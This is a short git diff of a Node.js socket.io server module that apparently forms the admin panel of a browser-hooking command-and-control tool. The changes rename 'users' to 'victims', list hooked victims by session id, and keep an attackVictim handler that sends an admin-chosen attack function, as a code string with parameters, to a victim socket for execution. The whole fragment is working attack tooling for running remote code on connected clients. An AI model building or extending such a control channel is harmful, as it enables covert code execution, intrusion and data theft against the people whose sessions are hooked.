@@ -12,7 +12,7 @@ module.exports.configure = function (io) {
 
     socket.join('admins')
 
-    socket.on('attackUser', attackUser)
+    socket.on('attackVictim', attackVictim)
     socket.on('disconnect', disconnect)
     socket.on('getAttacks', getAttacks)
     socket.on('getUsers', getUsers)
@@ -40,8 +40,8 @@ function deleteAttack(attackId){
 }
 
 function getUsers() {
-  Object.keys(victimSockets.sockets).forEach((id)=>{
-    module.exports.emit('newUser', victimSockets.sockets[id])
+  Object.values(victimSockets.victimsBySessionId).forEach((victim)=>{
+    module.exports.emit('newVictim', victim)
   })
 }
 
@@ -55,9 +55,9 @@ function disconnect() {
   console.log('admin disconnected')
 }
 
-function attackUser(data) {
-  console.log("received instructions to use attack " + data.attack + " on " + data.userSocket)
-  server.ioVictim.to(data.userSocket).emit('execute', {
+function attackVictim(data) {
+  console.log("received instructions to use attack " + data.attack + " on " + data.victimSocket)
+  server.ioVictim.to(data.victimSocket).emit('execute', {
     func: `var attack = ${data.attack.toString()}`,
     params: data.params
   })
